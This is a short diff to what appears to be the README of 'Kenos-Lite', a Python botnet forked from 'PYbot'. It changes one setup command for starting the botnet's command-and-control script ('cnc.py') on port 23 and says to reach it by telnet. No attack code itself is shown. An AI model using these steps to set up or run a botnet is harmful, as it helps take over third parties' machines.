@@ -11,7 +11,7 @@ A python botnet forked from "PYbot" which was discontinued, a small glimpse into
   <pre><code>sudo apt install python2 python3
 pip3 install colorama
 cd Kenos-Lite
-python cnc.py 23</code></pre>
+python3 cnc.py 23</code></pre>
   <li>Use telnet with the ip of your server and port 23</li>
   <div>
 
